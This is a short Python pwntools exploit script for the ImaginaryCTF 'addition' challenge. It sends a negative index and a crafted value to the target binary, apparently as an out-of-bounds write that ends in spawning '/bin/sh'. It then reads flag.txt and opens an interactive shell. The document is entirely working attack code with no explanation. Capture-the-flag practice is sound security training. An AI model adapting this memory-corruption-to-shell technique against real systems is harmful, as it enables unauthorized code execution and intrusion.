#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "addition.chal.imaginaryctf.org"
exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x00000000000012A5
            brva 0x00000000000012E6
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
payload = b'-73'
p.sendlineafter(b'add where? ', payload)
p.sendlineafter(b'add what? ', b'55024')
p.sendlineafter(b'add where? ', b'/bin/sh\0')
p.sendline(b'cat flag.txt')

p.interactive()